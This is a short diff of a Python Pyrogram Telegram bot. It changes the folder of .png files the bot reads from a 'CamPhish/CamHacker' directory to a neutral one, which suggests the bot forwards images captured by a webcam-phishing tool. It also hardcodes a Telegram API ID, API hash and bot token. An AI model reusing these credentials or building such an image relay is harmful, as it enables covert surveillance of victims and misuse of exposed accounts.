@@ -5,7 +5,7 @@ from pyrogram import Client, filters
 import time
 bot = Client("name", api_id="3030128", api_hash="cfc3885f5d2cbdbc5f10e6a643de2711",bot_token="1976201011:AAHMTReyFo2b81UD_nao3S41B-M602PFMxs")
 
-filelist=os.listdir("/root/CamPhish/CamHacker")
+filelist=os.listdir("/root/imgfiles")
 for fichier in filelist[:]: # filelist[:] makes a copy of filelist.
     if not(fichier.endswith(".png")):
         filelist.remove(fichier)
@@ -14,7 +14,7 @@ looper = 0
 @bot.on_message(filters.private)
 def start(Client, message):
     while 1:
-        filelist=os.listdir("/root/CamPhish/CamHacker")
+        filelist=os.listdir("/root/imgfiles")
         for fichier in filelist[:]: # filelist[:] makes a copy of filelist.
             if not(fichier.endswith(".png")):
                 filelist.remove(fichier)
